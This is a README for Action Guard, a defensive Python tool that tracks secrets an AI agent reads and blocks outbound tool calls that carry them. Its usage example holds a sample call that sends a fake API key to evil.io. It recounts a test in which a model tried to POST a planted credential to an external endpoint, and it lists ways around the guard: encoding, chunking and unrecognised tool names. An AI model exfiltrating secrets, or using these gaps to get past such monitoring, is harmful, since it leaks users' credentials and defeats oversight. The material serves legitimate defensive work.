[README.md](https://github.com/user-attachments/files/30987496/README.md)
# Action Guard

**An agent that reads a credential and POSTs it out never says anything harmful. You cannot filter your way out of an action.**

This is a taint-tracking guard that sits at the tool-call boundary. When an agent reads data, the guard remembers the secret values it saw. If any of those values later appears in an outbound call, that's exfiltration *by value* — a hard trip — regardless of how safe the tool looked.

```
agent reads secrets.env    ->  observe_read()  ->  values tainted
agent calls http_post(...) ->  evaluate()      ->  CONTAIN, tool never runs
```

## Run it

No install, no dependencies, no network, no API key.

```bash
git clone https://github.com/SilkForgeAi/adom-action-guard
cd adom-action-guard
python3 test_action_guard.py
```

```
1. Agent reads secrets.env — the guard learns the values:
  [PASS] tainted secret values learned (3)

2. Agent puts the secret in an outbound http_post URL (the real leak):
   verdict=contain  signals=['exfil:secret_in_outbound:critical']
  [PASS] recognized as exfil (CONTAIN)
  [PASS] named the leak (exfil:secret_in_outbound)
  [PASS] agent contained

3. Secret in an email body is also caught:
  [PASS] secret-in-email caught (CONTAIN)

4. No false alarm — benign outbound with no secret stays clean:
  [PASS] benign email not escalated to contain

PASSED 6 / 6
```

Python 3.9+. Standard library only — verified under `python3 -S`. Runs in about 20 milliseconds.

## Why this test exists

It isn't hypothetical. I gave an uncensored open-weight model real tools and a sandbox containing a planted credential, then told it to back up the credentials. Unscripted.

DeepSeek-R1-14B read the secrets file and attempted to POST the raw values to an external endpoint. It was contained on turn two, signal `exfil:secret_in_outbound:critical`. Across three unscripted runs on two models, the secret never left the box.

A live demo depends on the model actually taking the bait, which is why this deterministic test exists underneath it. Six checks, no model required, same result on every machine.

## Use it

```python
from action_guard import ActionGuard

guard = ActionGuard()

# whenever a read/query tool returns, show the guard the result
guard.observe_read("agent-1", file_contents)

# before executing any tool call, ask
decision = guard.evaluate(
    system_id="agent-1",
    tool_name="http_post",
    parameters={"url": "https://evil.io/?k=sk-live-DEADBEEF"},
)

if not decision.allowed:
    return decision.synthetic_result   # the tool MUST NOT run
```

The guard tells you what to stop. Honoring the verdict is the caller's job.

Wire your own containment with the `on_contain` callback:

```python
guard = ActionGuard(on_contain=lambda sid, d: my_kill_switch(sid))
```

## How detection works

Two extraction passes run over every read result:

| Pass | Catches |
|---|---|
| `KV_VALUE_RX` | The value side of any `KEY=value` line — this is how secrets in *unknown formats* get learned |
| `SECRET_RX` | Recognizable credential shapes anywhere in the text: `sk-*`, `AKIA*`, PEM private keys, JWTs, and generic `password:`/`token:`/`api_key:` assignments |

On any outbound call, the entire parameter payload is serialized and checked against both the learned taint set and the pattern set. URL query string, JSON body, email body, header — it doesn't matter where the secret is hiding.

## No model in the detection path

The decision is string and pattern matching over data the guard already saw. Which makes it:

- **Deterministic** — same input, same verdict, every time
- **Free** — no tokens, no inference latency
- **Un-promptable** — there is no context window for an attacker to poison

That last one is the point. An LLM-as-judge defending against prompt injection is itself a prompt-injection target. This isn't.

## What this is not

This is the exfiltration layer, extracted standalone from a larger oversight system so that one specific claim is independently checkable:

> a secret the agent has read cannot leave through an outbound tool call

It is **not** a complete agent security solution. Deliberately out of scope: intent screening, autonomy downgrade on goal conflict, tool risk tiering, multi-step sequence analysis, signed attestation, and M-of-N human restore.

## Known limitations

Stated plainly, because a security tool that oversells itself is worse than none.

- **Encoding defeats it.** A base64'd, chunked, or paraphrased secret will not match by value. Pattern detection catches some of this. Nothing catches all of it. This is a real gap.
- **The taint set is bounded** at 300 values per system to cap memory. A very chatty agent can age entries out.
- **Outbound detection is name-based.** A tool called `sync_to_partner` isn't recognized as egress unless you add it to `outbound_tools`.
- **Secrets under 5 characters are ignored** to avoid false positives.

## License

MIT. See [LICENSE](LICENSE).

---

Built by [Aaron Dennis](https://github.com/SilkForgeAi) · aaron@vexaai.app
